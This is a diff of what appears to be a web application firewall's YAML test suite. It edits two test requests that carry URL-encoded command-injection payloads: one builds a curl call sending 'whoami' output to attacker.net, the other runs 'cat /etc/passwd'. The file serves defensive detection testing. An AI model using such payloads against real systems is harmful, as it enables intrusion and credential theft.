@@ -236,7 +236,7 @@ tests:
       - stage:
           input:
             dest_addr: 127.0.0.1
-            data: a%3Dcurl%26%26b%3Dwhoami%26%26%24a%20attacker.net%2F%24b
+            data: cmd%3Da%3Dcurl%26%26b%3D%60whoami%60%26%26%24a%20attacker.net%2F%24b
             headers:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
               Host: localhost
@@ -253,7 +253,7 @@ tests:
       - stage:
           input:
             dest_addr: 127.0.0.1
-            data: a%3D%2Fetc%26%26b%3D%2Fpasswd%26%26c%3Dcat%26%26%24c%20%24a%24b
+            data: cmd=a%3D%2Fetc%26%26b%3D%2Fpasswd%26%26c%3Dcat%26%26%24c%20%24a%24b
             headers:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
               Host: localhost
